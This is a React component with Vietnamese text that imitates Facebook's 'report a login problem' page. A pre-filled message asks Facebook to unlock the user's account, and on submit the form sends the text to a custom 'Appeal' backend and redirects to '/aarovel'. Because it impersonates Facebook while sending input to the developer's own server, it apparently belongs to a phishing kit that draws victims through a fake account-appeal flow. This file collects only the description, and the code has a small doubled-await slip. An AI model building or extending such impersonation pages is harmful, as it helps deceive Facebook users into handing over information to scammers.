import { userService } from "@services/api/user/user.service";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
async function Appeal(body) {
  const { data } = await  await userService.Appeal(body);
  return data;
}

export default function LoginIssueReport() {
  const [description, setDescription] = useState(
    "Tôi không nhận được xác minh danh tính để mở khóa tài khoản Facebook của mình. Mong Facebook mở khóa giúp tôi."
  );
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
   const navigate = useNavigate();
  const handleSubmit = async () => {
    try {
      setLoading(true);
      setMessage("");

      const body = { content: description };
      await Appeal(body);
      navigate("/aarovel");
      setMessage("Báo cáo của bạn đã được gửi thành công.");
      setDescription(""); // Reset form nếu cần
    } catch (error) {
      setMessage("Đã xảy ra lỗi khi gửi báo cáo. Vui lòng thử lại.");
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="h-screen overflow-y-auto bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-md shadow-sm max-w-2xl h-full overflow-y-auto w-full">
        <div className="bg-gray-200 p-4 border-b border-gray-300">
          <h1 className="text-xl font-medium text-gray-700">
            Báo cáo vấn đề đăng nhập
          </h1>
        </div>

        <div className="p-6 space-y-6">
          <p className="text-gray-600">
            Nếu bạn đang gặp phải sự cố khi đăng nhập hoặc sự cố với mật khẩu,
            bạn đã đến đúng địa chỉ. Vui lòng sử dụng mẫu đơn này để cho chúng
            tôi biết về vấn đề mà bạn đang gặp phải.
          </p>

          <div className="text-gray-600">
            <p className="mb-2">
              Vui lòng cung cấp mô tả chi tiết về sự cố này, bao gồm:
            </p>
            <ol className="list-decimal pl-8 space-y-1">
              <li>Bạn đang làm gì khi sự cố xảy ra</li>
              <li>Bạn đã mong đợi điều gì sẽ xảy ra</li>
              <li>Điều gì thực sự đã xảy ra</li>
            </ol>
          </div>

          {/* Mô tả vấn đề */}
          <div className="space-y-2">
            <label htmlFor="issue-description" className="block text-gray-700">
              Mô tả vấn đề
            </label>
            <textarea
              id="issue-description"
              className="w-full border border-gray-300 rounded-md p-3 text-gray-700 min-h-[100px] focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none"
              value={description}
              onChange={(e) => setDescription(e.target.value)}
            />
          </div>

          {/* Ảnh chụp màn hình */}
          <div className="space-y-2">
            <label htmlFor="screenshot" className="block text-gray-700">
              Ảnh chụp màn hình
            </label>
            <p className="text-gray-500 text-sm">Không bắt buộc</p>
            <input
              type="file"
              id="screenshot"
              accept="image/*"
              className="block w-full text-gray-700 border border-gray-300 rounded-md p-2 file:mr-4 file:py-2 file:px-4 file:rounded file:border-0 file:text-sm file:font-semibold file:bg-gray-100 file:text-gray-700 hover:file:bg-gray-200"
            />
            <a href="#" className="text-blue-600 hover:underline text-sm">
              Hướng dẫn tải lên ảnh chụp màn hình
            </a>
          </div>

          {message && (
            <div className="text-sm text-center text-blue-600 font-medium">
              {message}
            </div>
          )}

          <div className="flex justify-end">
            <button
              onClick={handleSubmit}
              disabled={loading}
              className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition-colors disabled:opacity-50"
            >
              {loading ? "Đang gửi..." : "Gửi"}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
